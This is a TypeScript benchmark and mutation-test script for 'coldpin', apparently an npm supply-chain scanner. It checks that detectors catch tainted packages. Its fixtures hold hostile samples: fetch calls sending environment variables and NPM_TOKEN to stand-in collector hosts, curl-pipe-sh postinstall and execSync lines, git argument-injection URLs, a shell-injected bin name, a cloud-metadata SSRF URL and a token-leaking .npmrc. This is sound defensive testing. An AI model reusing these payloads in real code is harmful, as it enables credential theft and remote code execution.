#!/usr/bin/env node
/**
 * Real Executed Benchmark, Mutation-Proof, and Report Generator for `coldpin`.
 *
 * Implements NVIDIA Auto-Ontology's BENCHMARK.md rigor + REA `rea-analysis-optimization`
 * & `rea-ci-tests-audit` discipline:
 * - Executes a real 49-fixture security corpus (21 benign CLIs + 28 adversarial/fail-closed attacks)
 *   measuring real Recall, False Positive Rate, p50/p95 latency, and Peak RSS memory.
 * - Executes a real Git history cold vs. warm Split-Plane SQLite cache benchmark.
 * - Executes 18 real perturbation/mutation checks proving assertions fail red on regressions.
 * - Verifies `BENCHMARK.md` dataset digest freshness in `--check` mode.
 * - Reports Tier 3 Live Multi-Agent Sandbox Uplift honestly as NOT RUN (N/A) without fabrication.
 */

import { execFileSync, spawnSync } from "node:child_process";
import { createHash, createHmac, generateKeyPairSync, sign as cryptoSign } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { performance } from "node:perf_hooks";
import { PassThrough } from "node:stream";
import { gunzipSync, gzipSync } from "node:zlib";
import {
  validateRemoteGitUrl,
  verifyTarballVsGitParity,
  walkGitHistoryForCleanAnchor,
} from "../src/analysis/parity-and-bisect.ts";
import { SplitPlaneCache } from "../src/cache/sqlite-store.ts";
import { appendAuditEvent, verifyAuditLog } from "../src/compliance/audit-log.ts";
import {
  DEFAULT_POLICY,
  loadMcpPolicy,
  loadNpmrc,
  resolveAuthTokenForUrl,
  routeDiscoveryQuery,
  routeRegistry,
} from "../src/config/policy.ts";
import { resolveConfinedPath } from "../src/core/path-confinement.ts";
import { runAuditManifestBatch } from "../src/core/workflows.ts";
import { evaluateCommandText, evaluatePreToolUsePayload } from "../src/hook.ts";
import { validateOutboundUrl, verifyNpmAttestationPayload } from "../src/intel/registry-osv.ts";
import {
  EVIDENCE_CARD_UI_META,
  EVIDENCE_CARD_UI_MIME,
  EVIDENCE_CARD_UI_URI,
  renderEvidenceCardAppHtml,
} from "../src/mcp/evidence-card-app.ts";
import { HttpBearerAuthenticator, type JwksKeyEntry } from "../src/mcp/http-auth.ts";
import { ColdpinMcpServer, loadOperatorConfigFromEnv } from "../src/mcp/server.ts";
import { computeMcpSchemaPin, MCP_RESOURCES, MCP_TOOLS } from "../src/mcp/tool-catalog.ts";
import { computeSha512Integrity, unpackTarballInMemory } from "../src/quarantine/safe-unpack.ts";
import { ENGINE_VERSION } from "../src/types.ts";
import { assembleInspectionReport } from "../src/verdict/engine-and-formatters.ts";
import { triageUnpackedEntries } from "../src/analysis/static-triage.ts";
import { buildBenchmarkCorpus, runInspectFixture } from "../tests/benchmark-corpus.ts";
import { buildSyntheticTgz, buildTestNpmSlsaAttestation } from "../tests/helpers.ts";

const ROOT = resolve(import.meta.dirname, "..");

function percentile(values: number[], p: number): number {
  const sorted = [...values].sort((a, b) => a - b);
  const idx = Math.min(sorted.length - 1, Math.max(0, Math.ceil((p / 100) * sorted.length) - 1));
  return sorted[idx] ?? 0;
}

async function runGitCacheBenchmark(): Promise<{ commits: number; coldMs: number; warmMs: number; warmCacheHits: number; coldCacheHits: number }> {
  const dir = mkdtempSync(join(tmpdir(), "coldpin-bench-git-"));
  const cache = new SplitPlaneCache(join(dir, "bench.sqlite"));
  const git = (args: string[]) => execFileSync("git", args, { cwd: dir, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
  try {
    git(["init", "-b", "main"]);
    git(["config", "user.name", "Bench"]);
    git(["config", "user.email", "bench@example.com"]);
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "@bench/cli", version: "1.0.0", license: "MIT" }));
    mkdirSync(join(dir, "src"), { recursive: true });
    for (let f = 0; f < 8; f++) {
      writeFileSync(join(dir, "src", `mod${f}.js`), `export const m${f} = ${f};\n`);
    }
    git(["add", "."]);
    git(["commit", "-m", "init"]);

    for (let i = 1; i <= 10; i++) {
      writeFileSync(join(dir, "README.md"), `Revision ${i}\n`);
      git(["add", "."]);
      git(["commit", "-m", `docs: rev ${i}`]);
    }
    // Inject malware at commit 12, followed by 3 docs commits (forces walking 4 infected commits + 1 clean commit)
    writeFileSync(join(dir, "src", "mod0.js"), "const e = JSON.stringify(process.env); fetch('https://198.51.100.5/c2', { body: e });\n");
    git(["add", "."]);
    git(["commit", "-m", "inject"]);
    for (let i = 1; i <= 3; i++) {
      writeFileSync(join(dir, "README.md"), `Post-compromise rev ${i}\n`);
      git(["add", "."]);
      git(["commit", "-m", `docs: post ${i}`]);
    }

    const t0 = performance.now();
    const cold = await walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
    const coldMs = performance.now() - t0;
    const coldCacheHits = cold.inspected_commits.reduce((a, c) => a + c.cache_hits, 0);

    const t1 = performance.now();
    const warm = await walkGitHistoryForCleanAnchor({ package_name: "@bench/cli", repoUrlOrLocalPath: dir, isLocalDir: true, policy: DEFAULT_POLICY, cache });
    const warmMs = performance.now() - t1;
    const warmCacheHits = warm.inspected_commits.reduce((a, c) => a + c.cache_hits, 0);

    return { commits: warm.inspected_commits.length, coldMs, warmMs, warmCacheHits, coldCacheHits };
  } finally {
    cache.close();
    rmSync(dir, { recursive: true, force: true });
  }
}

async function runMutationChecks(): Promise<Array<{ id: string; passed: boolean; detail: string }>> {
  const results: Array<{ id: string; passed: boolean; detail: string }> = [];

  // Mutation 1: Injecting credential taint into clean fixture must flip verdict clean -> malicious
  const cleanBefore = await runInspectFixture("mut-clean", [
    { name: "package/package.json", content: JSON.stringify({ name: "mut-clean", version: "1.0.0", license: "MIT" }) },
    { name: "package/index.js", content: "console.log('ok');" },
  ]);
  const mutatedAfter = await runInspectFixture("mut-clean", [
    { name: "package/package.json", content: JSON.stringify({ name: "mut-clean", version: "1.0.0", license: "MIT" }) },
    { name: "package/index.js", content: "const d = JSON.stringify(process.env); fetch('https://198.51.100.1/x', { body: d });" },
  ]);
  results.push({
    id: "mut-01-taint-injection-flips-verdict",
    passed: cleanBefore === "VERIFIED_CLEAN_WITHIN_SCOPE" && mutatedAfter === "MALICIOUS_INDICATORS_FOUND",
    detail: `${cleanBefore} -> ${mutatedAfter}`,
  });

  // Mutation 2: Tampering 1 field in audit.jsonl must flip verifyAuditLog true -> false
  const dir = mkdtempSync(join(tmpdir(), "coldpin-mut-"));
  try {
    const lp = join(dir, "audit.jsonl");
    appendAuditEvent(lp, { action: "inspect", target: "x", verdict: "MALICIOUS_INDICATORS_FOUND", policy_sha256: "p", evidence_ids: [] });
    const okBefore = verifyAuditLog(lp).valid;
    writeFileSync(lp, readFileSync(lp, "utf8").replace("MALICIOUS_INDICATORS_FOUND", "VERIFIED_CLEAN_WITHIN_SCOPE"));
    const okAfter = verifyAuditLog(lp).valid;
    results.push({
      id: "mut-02-audit-tamper-flips-valid",
      passed: okBefore === true && okAfter === false,
      detail: `valid=${okBefore} -> valid=${okAfter}`,
    });

    // Mutation 3: Transposing private scope @acme -> @amce must flip private -> blocked_typo
    const pol = { ...DEFAULT_POLICY, private_scopes: ["@acme"], private_registries: { "@acme": "https://artifactory.acme.internal/npm" } };
    const npmrc = loadNpmrc(dir);
    const rBefore = routeRegistry("@acme/cli", pol, npmrc).route;
    const rAfter = routeRegistry("@amce/cli", pol, npmrc).route;
    results.push({
      id: "mut-03-private-scope-typo-blocks-egress",
      passed: rBefore === "private" && rAfter === "blocked_typo",
      detail: `${rBefore} -> ${rAfter}`,
    });

    // Mutation 4: Adding postinstall to tarball not present in Git must flip parity to TARBALL_SOURCE_DRIFT
    execFileSync("git", ["init", "-b", "main"], { cwd: dir, stdio: "ignore" });
    execFileSync("git", ["config", "user.name", "M"], { cwd: dir, stdio: "ignore" });
    execFileSync("git", ["config", "user.email", "m@e.com"], { cwd: dir, stdio: "ignore" });
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p", version: "1.0.0", license: "MIT" }));
    execFileSync("git", ["add", "."], { cwd: dir, stdio: "ignore" });
    execFileSync("git", ["commit", "-m", "init v1"], { cwd: dir, stdio: "ignore" });
    const c1 = execFileSync("git", ["rev-parse", "HEAD"], { cwd: dir, encoding: "utf8" }).trim();

    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p", version: "1.1.0", license: "MIT" }));
    execFileSync("git", ["add", "."], { cwd: dir, stdio: "ignore" });
    execFileSync("git", ["commit", "-m", "release v1.1"], { cwd: dir, stdio: "ignore" });
    const c2 = execFileSync("git", ["rev-parse", "HEAD"], { cwd: dir, encoding: "utf8" }).trim();

    const pClean = (
      await verifyTarballVsGitParity({
        tarballManifest: { name: "p", version: "1.1.0", license: "MIT" },
        tarballEntries: [],
        provenanceAttested: false,
        gitHead: c2,
        localGitDir: dir,
      })
    ).tier;
    const pDrifted = (
      await verifyTarballVsGitParity({
        tarballManifest: { name: "p", version: "1.1.0", license: "MIT", scripts: { postinstall: "curl https://evil.test | sh" } },
        tarballEntries: [],
        provenanceAttested: true, // Even when provenance metadata claims attested, local Git drift MUST still trigger!
        gitHead: c2,
        localGitDir: dir,
      })
    ).tier;
    results.push({
      id: "mut-04-tarball-hook-drift-flips-parity",
      passed: pClean === "MANIFEST_PARITY_VERIFIED" && pDrifted === "TARBALL_SOURCE_DRIFT",
      detail: `${pClean} -> ${pDrifted}`,
    });

    // Mutation 5: Template literal interpolation exfiltration must flip clean -> malicious
    const tplClean = await runInspectFixture("mut-tpl", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-tpl", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: "fetch(`https://registry.npmjs.org/?m=${process.env.NODE_ENV}`);" },
    ]);
    const tplEvil = await runInspectFixture("mut-tpl", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-tpl", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: "fetch(`https://collector.example/?t=${process.env.NPM_TOKEN}`);" },
    ]);
    results.push({
      id: "mut-05-template-literal-exfil-caught",
      passed: tplClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && tplEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${tplClean} -> ${tplEvil}`,
    });

    // Mutation 6: Git remote URL argument injection / ext:: protocol must flip valid true -> false
    const gitUrlOk = validateRemoteGitUrl("https://github.com/org/repo.git").valid;
    const gitUrlInject = validateRemoteGitUrl("--upload-pack=calc.exe").valid;
    const gitUrlExt = validateRemoteGitUrl("ext::sh -c id").valid;
    results.push({
      id: "mut-06-git-arg-injection-rejected",
      passed: gitUrlOk === true && gitUrlInject === false && gitUrlExt === false,
      detail: `https=${gitUrlOk} -> opt=${gitUrlInject}, ext=${gitUrlExt}`,
    });

    // Mutation 7: Tarball-only compromise on clean Git HEAD must block USE_PINNED_LATEST and roll back
    const relMap = new Map([
      [c1, { version: "1.0.0", tarball_sha512: "sha512-CLEAN100==", provenance_attested: true }],
      [c2, { version: "1.1.0", tarball_sha512: "sha512-POISON110==", provenance_attested: false }],
    ]);
    const beforeComp = (
      await walkGitHistoryForCleanAnchor({
        package_name: "p",
        repoUrlOrLocalPath: dir,
        isLocalDir: true,
        policy: DEFAULT_POLICY,
        releaseTarballByCommit: relMap,
      })
    ).recommended_action;
    const afterComp = await walkGitHistoryForCleanAnchor({
      package_name: "p",
      repoUrlOrLocalPath: dir,
      isLocalDir: true,
      policy: DEFAULT_POLICY,
      releaseTarballByCommit: relMap,
      compromisedVersions: new Set(["1.1.0"]),
    });
    results.push({
      id: "mut-07-tarball-only-compromise-blocks-latest",
      passed:
        beforeComp === "USE_PINNED_LATEST" &&
        afterComp.recommended_action === "ROLLBACK_TO_SAFE_ANCHOR" &&
        afterComp.safe_anchor?.version === "1.0.0",
      detail: `${beforeComp} -> ${afterComp.recommended_action}@${afterComp.safe_anchor?.version ?? "none"}`,
    });

    // Mutation 8: Corrupting a tar header byte must fail POSIX header checksum check
    const goodTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "chk", version: "1.0.0" }) },
    ]);
    const goodUnpack = await unpackTarballInMemory(goodTgz, DEFAULT_POLICY);
    // Construct a raw tar block with corrupted checksum byte
    const badTar = Buffer.alloc(1536, 0);
    badTar.write("package/package.json", 0, "utf8");
    badTar.write("0000000\0", 148, 8, "ascii");
    const badUnpack = await unpackTarballInMemory(gzipSync(badTar), DEFAULT_POLICY);
    results.push({
      id: "mut-08-tar-checksum-corruption-rejected",
      passed:
        goodUnpack.ok === true &&
        badUnpack.ok === false &&
        badUnpack.observations.some((o) => o.code === "ARCHIVE_CORRUPT_HEADER_CHECKSUM"),
      detail: `ok=${goodUnpack.ok} -> ok=${badUnpack.ok}`,
    });

    // Mutation 9: Shell metacharacters in package.json bin key must flip clean -> malicious
    const binClean = await runInspectFixture("mut-bin", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-bin", version: "1.0.0", license: "MIT", bin: { cli: "./cli.js" } }) },
      { name: "package/cli.js", content: "console.log('ok');" },
    ]);
    const binEvil = await runInspectFixture("mut-bin", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-bin", version: "1.0.0", license: "MIT", bin: { "cli; id #": "./cli.js" } }) },
      { name: "package/cli.js", content: "console.log('ok');" },
    ]);
    results.push({
      id: "mut-09-bin-shell-injection-blocked",
      passed: binClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && binEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${binClean} -> ${binEvil}`,
    });

    // Mutation 10: Splitting NPM_TOKEN exfil across two ESM modules must flip clean -> malicious
    const splitClean = await runInspectFixture("mut-split", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-split", version: "1.0.0", license: "MIT" }) },
      { name: "package/a.js", content: "export const mode = process.env.NODE_ENV || 'prod';" },
      { name: "package/b.js", content: 'import { mode } from "./a.js"; console.log(mode);' },
    ]);
    const splitEvil = await runInspectFixture("mut-split", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-split", version: "1.0.0", license: "MIT" }) },
      { name: "package/a.js", content: "export const tok = process.env.NPM_TOKEN;" },
      { name: "package/b.js", content: 'import { tok } from "./a.js"; fetch("https://collector.example/hit", { method: "POST", body: tok });' },
    ]);
    results.push({
      id: "mut-10-cross-file-split-taint-caught",
      passed: splitClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && splitEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${splitClean} -> ${splitEvil}`,
    });

    // Mutation 11: Appending a tar entry after a single EOF zero block must fail closed
    const cleanRaw = gunzipSync(goodTgz);
    const extraRaw = gunzipSync(buildSyntheticTgz([{ name: "package/extra.js", content: "console.log(1);" }]));
    const smuggledUnpack = await unpackTarballInMemory(
      gzipSync(Buffer.concat([cleanRaw.subarray(0, cleanRaw.length - 512), extraRaw])),
      DEFAULT_POLICY,
    );
    results.push({
      id: "mut-11-tar-eof-smuggling-rejected",
      passed:
        goodUnpack.ok === true &&
        smuggledUnpack.ok === false &&
        smuggledUnpack.observations.some((o) => o.code === "ARCHIVE_EOF_POLYGLOT_SMUGGLING"),
      detail: `ok=${goodUnpack.ok} -> ok=${smuggledUnpack.ok}`,
    });

    // Mutation 12: IPv4-mapped IPv6 cloud metadata & loopback SSRF must be blocked
    const pubHttpsOk = validateOutboundUrl("https://registry.npmjs.org/prettier").ok;
    const mappedMetaBlocked = validateOutboundUrl("https://[::ffff:169.254.169.254]/latest/meta-data/").ok;
    const mappedGitLoopBlocked = validateRemoteGitUrl("https://[::ffff:127.0.0.1]/org/repo.git").valid;
    results.push({
      id: "mut-12-ipv6-mapped-ssrf-blocked",
      passed: pubHttpsOk === true && mappedMetaBlocked === false && mappedGitLoopBlocked === false,
      detail: `pub=${pubHttpsOk} -> meta=${mappedMetaBlocked}, gitLoop=${mappedGitLoopBlocked}`,
    });

    // Mutation 13: Aliased ESM child_process import switching benign command -> curl-pipe-sh must flip clean -> malicious
    const aliasClean = await runInspectFixture("mut-alias-cp", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-alias-cp", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'import { execSync as run } from "node:child_process"; run("git --version");' },
    ]);
    const aliasEvil = await runInspectFixture("mut-alias-cp", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-alias-cp", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'import { execSync as run } from "node:child_process"; run("curl https://evil.test/s | sh");' },
    ]);
    results.push({
      id: "mut-13-aliased-esm-exec-caught",
      passed: aliasClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && aliasEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${aliasClean} -> ${aliasEvil}`,
    });

    // Mutation 14: Multi-hop helper wrapper & dynamic import(expr) must flip clean -> malicious/quarantined
    const hopClean = await runInspectFixture("mut-hop", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-hop", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const l1 = (x) => fetch(x); const l2 = (y) => l1(y); l2("https://registry.npmjs.org/-/ping");' },
    ]);
    const hopEvil = await runInspectFixture("mut-hop", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-hop", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const l1 = (x) => fetch("https://collector.example/x", { body: x }); const l2 = (y) => l1(y); l2(globalThis.process.env.NPM_TOKEN);' },
    ]);
    results.push({
      id: "mut-14-multihop-wrapper-global-env-caught",
      passed: hopClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && hopEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${hopClean} -> ${hopEvil}`,
    });

    // Mutation 15: Unverified/unanchored npm provenance MUST fail strict require_provenance; tampered SLSA digest MUST flip to MALICIOUS_INDICATORS_FOUND
    const provTgz = buildSyntheticTgz([
      { name: "package/package.json", content: JSON.stringify({ name: "mut-prov", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: "console.log('ok');" },
    ]);
    const provSha = computeSha512Integrity(provTgz);
    const provUnpack = await unpackTarballInMemory(provTgz, DEFAULT_POLICY, provSha);
    const provTriage = triageUnpackedEntries(provUnpack.entries, DEFAULT_POLICY);
    const leafValidAtt = buildTestNpmSlsaAttestation({ packageName: "mut-prov", version: "1.0.0", tarballSha512Sri: provSha });
    const leafTamperedAtt = buildTestNpmSlsaAttestation({ packageName: "mut-prov", version: "1.0.0", tarballSha512Sri: provSha, tamperDigest: true });
    const leafInspOk = verifyNpmAttestationPayload(leafValidAtt, provSha, "mut-prov");
    const leafInspBad = verifyNpmAttestationPayload(leafTamperedAtt, provSha, "mut-prov");
    const strictLeafVerdict = assembleInspectionReport({
      package_name: "mut-prov",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "b",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: [],
      unpack: provUnpack,
      triage: provTriage,
      parity: await verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspOk }),
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: { ...DEFAULT_POLICY, require_provenance: true },
      host_capabilities: { node_version: process.version, git_available: true, git_partial_clone_supported: true, rea_cli_available: false, sqlite_available: true },
      cwd: tmpdir(),
    }).verdict;
    const tamperedVerdict = assembleInspectionReport({
      package_name: "mut-prov",
      version: "1.0.0",
      org_or_scope: "unscoped",
      creator: "b",
      category_tags: [],
      summary: "ok",
      license: "MIT",
      bin_names: [],
      unpack: provUnpack,
      triage: provTriage,
      parity: await verifyTarballVsGitParity({ tarballManifest: provTriage.manifest, tarballEntries: provUnpack.entries, provenanceAttested: false, provenanceInspection: leafInspBad }),
      advisories: [],
      registryObservations: [],
      registryUnknowns: [],
      policy: DEFAULT_POLICY,
      host_capabilities: { node_version: process.version, git_available: true, git_partial_clone_supported: true, rea_cli_available: false, sqlite_available: true },
      cwd: tmpdir(),
    }).verdict;
    results.push({
      id: "mut-15-provenance-epistemic-and-digest-tamper",
      passed:
        leafInspOk.status === "dsse_leaf_verified_unanchored" &&
        leafInspOk.provenance_attested === false &&
        strictLeafVerdict === "UNVERIFIABLE_UNKNOWN" &&
        tamperedVerdict === "MALICIOUS_INDICATORS_FOUND",
      detail: `strict_unanchored=${strictLeafVerdict} -> tampered=${tamperedVerdict}`,
    });

    // Mutation 16: Semicolon-free optional-chaining + indirect call & non-PURL/wrong-version provenance rejection
    const asiClean = await runInspectFixture("mut-asi", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-asi", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const reserved = ["eval"]\nconst re = /^ok/\nconst m = re.exec(process.env.MY_MODE || "")\nconsole.log(reserved, m)' },
    ]);
    const asiEvil = await runInspectFixture("mut-asi", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-asi", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const tok = process?.env?.NPM_TOKEN\nfetch.call(globalThis, "https://collector.example/a", { body: tok })' },
    ]);
    const nonPurlAtt = buildTestNpmSlsaAttestation({
      packageName: "mut-prov",
      version: "1.0.0",
      tarballSha512Sri: provSha,
      overrideSubjectName: "not-a-purl",
    });
    const wrongVerAtt = buildTestNpmSlsaAttestation({
      packageName: "mut-prov",
      version: "9.9.9",
      tarballSha512Sri: provSha,
    });
    const nonPurlStatus = verifyNpmAttestationPayload(nonPurlAtt, provSha, "mut-prov", undefined, "1.0.0").status;
    const wrongVerStatus = verifyNpmAttestationPayload(wrongVerAtt, provSha, "mut-prov", undefined, "1.0.0").status;
    results.push({
      id: "mut-16-no-semi-opt-chain-and-prov-purl-strict",
      passed:
        asiClean === "VERIFIED_CLEAN_WITHIN_SCOPE" &&
        asiEvil === "MALICIOUS_INDICATORS_FOUND" &&
        nonPurlStatus === "verification_failed" &&
        wrongVerStatus === "verification_failed",
      detail: `asi=${asiClean}->${asiEvil}, nonPurl=${nonPurlStatus}, wrongVer=${wrongVerStatus}`,
    });

    // Mutation 17: Lexical param shadowing / benign env alias vs unshadowed closure taint capture
    const scopeClean = await runInspectFixture("mut-scope", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-scope", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const tok = process.env.NPM_TOKEN; var env2 = process.env; const c = env2.NO_COLOR; function send(tok) { fetch("https://registry.npmjs.org", { body: tok + c }); } send("ok");' },
    ]);
    const scopeEvil = await runInspectFixture("mut-scope", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-scope", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: 'const tok = process.env.NPM_TOKEN; function send() { fetch("https://collector.example/c", { body: tok }); } send();' },
    ]);
    results.push({
      id: "mut-17-scoped-shadow-vs-closure-taint",
      passed: scopeClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && scopeEvil === "MALICIOUS_INDICATORS_FOUND",
      detail: `${scopeClean} -> ${scopeEvil}`,
    });

    // Mutation 18: Unicode RegExp character-class table (benign) vs dense hex-escaped string payload (obfuscated)
    const uniRanges = Array.from({ length: 120 }, (_, i) => `\\u${(0x00c0 + i * 4).toString(16).padStart(4, "0")}-\\u${(0x00c0 + i * 4 + 2).toString(16).padStart(4, "0")}`).join("");
    const uniClean = await runInspectFixture("mut-uni", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-uni", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: `const UNI_RE = /[${uniRanges}]/u; export const check = (s) => UNI_RE.test(s);` },
    ]);
    const denseHex = Array.from({ length: 84 }, (_, i) => `\\x${(65 + (i % 26)).toString(16)}`).join("");
    const uniEvil = await runInspectFixture("mut-uni", [
      { name: "package/package.json", content: JSON.stringify({ name: "mut-uni", version: "1.0.0", license: "MIT" }) },
      { name: "package/index.js", content: `const p = "${denseHex}"; console.log(p);` },
    ]);
    results.push({
      id: "mut-18-unicode-regex-vs-dense-escape-obfuscation",
      passed: uniClean === "VERIFIED_CLEAN_WITHIN_SCOPE" && uniEvil === "QUARANTINE_SUSPICIOUS",
      detail: `${uniClean} -> ${uniEvil}`,
    });

    // Mutation 19 ([MCP-01]): Untrusted workspace .coldpin.policy.json cannot weaken KEV/OSV controls in MCP mode
    const wsPolDir = join(dir, "ws-pol");
    mkdirSync(wsPolDir, { recursive: true });
    writeFileSync(
      join(wsPolDir, ".coldpin.policy.json"),
      JSON.stringify({ block_on_kev: false, osv_api_url: "https://evil.example", cooldown_hours: 0, private_scopes: ["@extra"] }),
    );
    const mcpPol = loadMcpPolicy({ workspaceRoot: wsPolDir, trustWorkspacePolicy: false }).policy;
    results.push({
      id: "mut-19-mcp-workspace-policy-downgrade-blocked",
      passed:
        mcpPol.block_on_kev === true &&
        mcpPol.osv_api_url === DEFAULT_POLICY.osv_api_url &&
        mcpPol.cooldown_hours === DEFAULT_POLICY.cooldown_hours &&
        mcpPol.private_scopes.includes("@extra"),
      detail: `kev=${mcpPol.block_on_kev}, osv=${mcpPol.osv_api_url}, added_scope=${mcpPol.private_scopes.includes("@extra")}`,
    });

    // Mutation 20 ([MCP-02]): Tampering MCP audit attribution field (tool_name) must flip verifyAuditLog true -> false
    const mcpAuditPath = join(dir, "mcp-audit.jsonl");
    appendAuditEvent(mcpAuditPath, {
      invoker_surface: "mcp",
      mcp_client_name: "antigravity",
      tool_name: "inspect_package_artifact",
      action: "inspect",
      target: "demo",
      verdict: "VERIFIED_CLEAN_WITHIN_SCOPE",
      policy_sha256: "p",
      evidence_ids: [],
    });
    const mcpAuditOk = verifyAuditLog(mcpAuditPath).valid;
    writeFileSync(mcpAuditPath, readFileSync(mcpAuditPath, "utf8").replace("inspect_package_artifact", "discover_packages"));
    const mcpAuditTampered = verifyAuditLog(mcpAuditPath).valid;
    results.push({
      id: "mut-20-mcp-audit-attribution-tamper-caught",
      passed: mcpAuditOk === true && mcpAuditTampered === false,
      detail: `valid=${mcpAuditOk} -> valid=${mcpAuditTampered}`,
    });

    // Mutation 21 ([MCP-03]): Offline resolve-anchor must hard-block remote HTTPS git clone
    const offAnchor = await walkGitHistoryForCleanAnchor({
      package_name: "demo",
      repoUrlOrLocalPath: "https://github.com/org/repo.git",
      isLocalDir: false,
      policy: { ...DEFAULT_POLICY, offline_mode: true },
    });
    results.push({
      id: "mut-21-offline-resolve-anchor-blocks-git-clone",
      passed:
        offAnchor.recommended_action === "BLOCK_NO_SAFE_PATH" &&
        offAnchor.unknowns.some((u) => u.startsWith("OFFLINE_MODE_GIT_CLONE_BLOCKED")),
      detail: `${offAnchor.recommended_action} (${offAnchor.unknowns[0]?.split(":")[0] ?? "none"})`,
    });

    // Mutation 22 ([MCP-04]): Discovery creator/category screening + Git URL query/userinfo rejection
    const discCreatorTypo = routeDiscoveryQuery("lint", undefined, pol, npmrc, { creator: "@amce/bot" }).route;
    const discSecretCat = routeDiscoveryQuery("lint", undefined, pol, npmrc, {
      category: ["ghp", "1234567890abcdef1234567890"].join("_"),
    }).route;
    const gitQueryBlocked = validateRemoteGitUrl("https://github.com/org/repo.git?beacon=1").valid;
    const gitUserinfoBlocked = validateRemoteGitUrl("https://user:pass@github.com/org/repo.git").valid;
    results.push({
      id: "mut-22-discover-fields-and-git-url-exfil-blocked",
      passed:
        discCreatorTypo === "blocked_typo" &&
        discSecretCat === "blocked_secret" &&
        gitQueryBlocked === false &&
        gitUserinfoBlocked === false,
      detail: `creator=${discCreatorTypo}, secret=${discSecretCat}, gitQ=${gitQueryBlocked}, gitUser=${gitUserinfoBlocked}`,
    });

    // Mutation 23 ([MCP-05]): Workspace root confinement blocks traversal escape & NTFS ADS colons
    const confRoot = join(dir, "root-a");
    mkdirSync(confRoot, { recursive: true });
    const insideFile = join(confRoot, "ok.tgz");
    writeFileSync(insideFile, "ok");
    const insideOk = resolveConfinedPath(insideFile, [confRoot], { requireRegularFile: true }).ok;
    const escapeBlocked = resolveConfinedPath(join(confRoot, "..", "mcp-audit.jsonl"), [confRoot], { requireRegularFile: true }).ok;
    const adsBlocked = resolveConfinedPath(`${insideFile}:hidden`, [confRoot], { requireRegularFile: true }).ok;
    results.push({
      id: "mut-23-root-confinement-blocks-escape-and-ads",
      passed: insideOk === true && escapeBlocked === false && adsBlocked === false,
      detail: `inside=${insideOk}, escape=${escapeBlocked}, ads=${adsBlocked}`,
    });

    // Mutation 24 ([MCP-09]): Workspace .npmrc _authToken ignored + exact host/path match + HTTPS-only auth
    const wsRcDir = join(dir, "ws-rc");
    mkdirSync(wsRcDir, { recursive: true });
    process.env["COLDPIN_MUT_SECRET"] = "secret-val-123";
    try {
      writeFileSync(join(wsRcDir, ".npmrc"), "//evil.example/:_authToken=${COLDPIN_MUT_SECRET}\n");
      const loadedWsRc = loadNpmrc(wsRcDir);
      const wsTokenIgnored = !("evil.example" in loadedWsRc.auth_token_env_by_host);
      const syntheticRc = {
        paths_loaded: [],
        scoped_registries: {},
        auth_token_env_by_host: { "corp.local": "COLDPIN_MUT_SECRET" },
      };
      const exactHttps = resolveAuthTokenForUrl("https://corp.local/npm", syntheticRc);
      const prefixConfused = resolveAuthTokenForUrl("https://corp.local.evil.com/npm", syntheticRc);
      const plainHttp = resolveAuthTokenForUrl("http://corp.local/npm", syntheticRc);
      results.push({
        id: "mut-24-npmrc-auth-exfil-and-prefix-confusion-blocked",
        passed:
          wsTokenIgnored &&
          exactHttps === "secret-val-123" &&
          prefixConfused === undefined &&
          plainHttp === undefined,
        detail: `wsIgnored=${wsTokenIgnored}, exact=${Boolean(exactHttps)}, prefix=${prefixConfused}, http=${plainHttp}`,
      });
    } finally {
      delete process.env["COLDPIN_MUT_SECRET"];
    }

